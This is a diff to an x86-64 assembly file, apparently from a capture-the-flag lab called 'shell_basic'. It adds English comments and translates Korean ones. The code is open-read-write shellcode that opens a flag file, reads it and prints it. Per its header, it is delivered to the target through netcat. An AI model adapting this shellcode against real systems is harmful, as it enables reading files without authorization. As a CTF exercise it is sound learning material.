@@ -1,7 +1,11 @@
+; This assembly code represents the ORW (Open-Read-Write) system call.
+; The string allocation part of the assembly code refers to the result of `sh-write-string.py`
+; This code is converted to shellcode in the `shell-code.sh` script and passed to the system via netcat.
+
 section .text
 global _start
 _start:
-    mov rax, 0x0000000000000000    ; 
+    mov rax, 0x0000000000000000    ; \0
     push rax
     mov rax, 0x676e6f6f6f6f6f6f    ; oooooong
     push rax
@@ -19,17 +23,17 @@ _start:
     mov rax, 2      ; rax = 2 ; syscall_open
     syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)
 
-    ; syscall의 반환 값은 rax로 저장됩니다.
-    ; 따라서 open으로 획득한 /home/shell_basic/flag_name_is_loooooong의 fd는 rax에 저장됩니다.
-    ; read의 첫 번째 인자를 이 값으로 설정해야 하므로 rax를 rdi에 대입합니다.
+    ; The return value of the syscall is stored in rax.
+    ; Therefore, the fd of `/home/shell_basic/flag_name_is_loooooong` obtained by open is stored in rax.
+    ; Assign rax to rdi as the first argument of read.
 
-    mov rdi, rax      ; rdi = fd
+    mov rdi, rax      ; Set rdi to fd
     mov rsi, rsp
-    sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
-    mov rdx, 0x30     ; rdx = 0x30     ; len
-    mov rax, 0x0      ; rax = 0        ; syscall_read
-    syscall           ; read(fd, buf, 0x30)
+    sub rsi, 0x30     ; Set rsi to rsp-0x30 (buf)
+    mov rdx, 0x30     ; Set rdx to 0x30 (len)
+    mov rax, 0x0      ; Set rax to 0 (syscall_read)
+    syscall           ; Call the read syscall with (fd, buf, 0x30)
 
-    mov rdi, 1        ; rdi = 1 ; fd = stdout
-    mov rax, 0x1      ; rax = 1 ; syscall_write
-    syscall           ; write(fd, buf, 0x30)
+    mov rdi, 1        ; Set rdi to 1 (stdout)
+    mov rax, 0x1      ; Set rax to 1 (syscall_write)
+    syscall           ; Call the write syscall with (fd, buf, 0x30)
